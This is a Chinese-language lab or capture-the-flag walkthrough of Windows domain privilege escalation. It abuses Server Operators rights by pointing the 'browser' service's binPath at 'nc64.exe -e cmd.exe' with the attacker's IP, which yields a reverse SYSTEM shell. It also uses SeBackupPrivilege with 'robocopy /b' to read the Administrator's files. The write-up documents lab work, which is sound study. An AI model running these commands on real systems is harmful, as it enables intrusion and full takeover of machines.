![image-20240730175303829](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730175305311-1791317928.png)

登陆成功

# AD域提权

## 信息搜集

先看一下该用户所拥有的权限

![image-20240730180854225](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730180856080-662594263.png)

之前在`bloodhound`中提到过该用户属于`SERVER_OPERATORS`组（高权限组）

> Server Operators组：该组仅存在于域控制器上的内置组。默认情况下，该组没有成员。服务器操作员可以交互式登录到服务器；创建和删除网络共享；启动和停止服务；备份和恢复文件；格式化电脑硬盘；并关闭计算机。

所以可以尝试利用一下该组权限

## 滥用Server Operators组权限实现权限提升

* 利用思路

> 可以找系统服务，将其执行改写，比如我让他去执行nc为我机器建立一个反向连接的shell，然后将服务重启，那么系统便会加载该服务并建立一个反向连接的shell给我的机器，该shell应该是系统级别的。

首先通过`upload`将``nc64.exe传上去

![image-20240730181747343](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730181748748-1462306931.png)

经过多次测试后发现可以改变`browser`服务的路径

`sc.exe config browser binPath= "C:\Users\jorden\Documents\nc64.exe -e cmd.exe 10.10.14.3 80"`

![image-20240730183321829](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730183323514-296023642.png)

先在`kali`中设置监听

`nc -lvp 80`

![image-20240730183427653](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730183429220-759850834.png)

然后在靶机中手动重启`browser`服务

`sc.exe stop browser`

`sc.exe start browser`

![image-20240730183806758](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730183808518-2033487681.png)

此时`kali`中收到回显

![image-20240730184218688](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730184223527-981482744.png)

发现已经是`system`权限

![image-20240730193237991](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730193239799-1215521076.png)

最后在`C:\Users\Administrator\Desktop`目录下找到`root.txt`

# 其他提权方法

## SeBackupPrivilege和SeRestorePrivilege权限的滥用

在对`jorden`用户信息搜集的时候，发现如下内容

![image-20240730193320821](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730193338002-1111181364.png)

发现该用户具有`SeBackupPrivilege`和`SeRestorePrivilege`权限

有了`SeBackupPrivilege`和`SeRestorePrivilege`这两个权限，就可以用`robocopy`来读取文件

`robocopy /b C:\users\administrator\desktop C:\Users\jorden\Documents`

![image-20240730193634029](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730193636356-418270461.png)